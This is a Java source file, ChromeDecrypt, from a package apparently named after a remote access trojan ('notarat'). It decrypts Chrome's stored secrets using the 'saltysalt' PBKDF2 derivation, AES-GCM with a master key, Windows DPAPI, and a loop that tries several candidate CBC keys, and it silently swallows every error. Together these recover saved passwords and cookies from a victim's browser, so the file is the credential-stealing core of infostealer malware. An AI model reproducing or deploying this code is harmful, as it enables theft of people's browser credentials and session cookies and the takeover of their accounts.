package dev.xotic.notarat.crypto;

import dev.xotic.notarat.util.PathUtil;
import dev.xotic.notarat.util.PathUtil.OS;

import javax.crypto.Cipher;
import javax.crypto.Mac;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.List;

public final class ChromeDecrypt {

    private static final byte[] SALT = "saltysalt".getBytes(StandardCharsets.US_ASCII);
    private static final byte[] IV = new byte[16];
    static { Arrays.fill(IV, (byte) ' '); }

    private static final boolean DEBUG = Boolean.getBoolean("notarat.debug");

    private final byte[] gcmKey;
    private final List<byte[]> cbcCandidates;

    public ChromeDecrypt(byte[] gcmKey, List<byte[]> cbcCandidates) {
        this.gcmKey = gcmKey;
        this.cbcCandidates = cbcCandidates;
    }
    public static byte[] pbkdf2Bytes(byte[] password, int iterations, int bits) throws Exception {
        int dkLen = bits / 8;
        int hLen = 20; // SHA1 output size
        int blocks = (dkLen + hLen - 1) / hLen;

        Mac mac = Mac.getInstance("HmacSHA1");
        mac.init(new SecretKeySpec(password, "HmacSHA1"));

        byte[] dk = new byte[dkLen];
        int off = 0;
        for (int i = 1; i <= blocks; i++) {
            mac.reset();
            mac.update(SALT);
            mac.update((byte)((i >>> 24) & 0xff));
            mac.update((byte)((i >>> 16) & 0xff));
            mac.update((byte)((i >>> 8) & 0xff));
            mac.update((byte)(i & 0xff));

            byte[] u = mac.doFinal();
            byte[] t = u.clone();
            for (int iter = 1; iter < iterations; iter++) {
                u = mac.doFinal(u);
                for (int k = 0; k < t.length; k++) t[k] ^= u[k];
            }
            int n = Math.min(hLen, dkLen - off);
            System.arraycopy(t, 0, dk, off, n);
            off += n;
        }
        return dk;
    }

    public String decrypt(byte[] blob) {
        if (blob == null || blob.length < 4) return null;
        String prefix = new String(blob, 0, 3, StandardCharsets.US_ASCII);
        byte[] payload = Arrays.copyOfRange(blob, 3, blob.length);

        try {
            if ("v10".equals(prefix)) {
                if (gcmKey != null) {
                    try { return gcm(payload, gcmKey); }
                    catch (Throwable t) { }
                }
                if (PathUtil.currentOS == OS.WINDOWS) {
                    try {
                        byte[] dpapi = WinDpapi.unprotect(payload);
                        if (dpapi != null) return new String(dpapi, StandardCharsets.UTF_8);
                    } catch (Throwable t) { }
                }
                String s = tryAllCbc(payload, "v10");
                if (s != null) return s;
            } else if ("v11".equals(prefix)) {
                String s = tryAllCbc(payload, "v11");
                if (s != null) return s;
            } else {
            }
        } catch (Throwable ignored) {}
        return null;
    }

    private String tryAllCbc(byte[] payload, String tag) {
        if (cbcCandidates == null) return null;
        for (int i = 0; i < cbcCandidates.size(); i++) {
            byte[] k = cbcCandidates.get(i);
            if (k == null || k.length == 0) continue;
            try {
                String s = cbc(payload, k);
                if (s != null && !s.isEmpty()) return s;
            } catch (Throwable t) {
            }
        }
        return null;
    }



    private static String gcm(byte[] data, byte[] key) throws Exception {
        byte[] nonce = Arrays.copyOfRange(data, 0, 12);
        byte[] ct    = Arrays.copyOfRange(data, 12, data.length);
        Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
        c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"),
                new GCMParameterSpec(128, nonce));
        return new String(c.doFinal(ct), StandardCharsets.UTF_8);
    }

    private static String cbc(byte[] data, byte[] key) throws Exception {
        Cipher c = Cipher.getInstance("AES/CBC/PKCS5Padding");
        c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"),
                new IvParameterSpec(IV));
        return new String(c.doFinal(data), StandardCharsets.UTF_8);
    }
}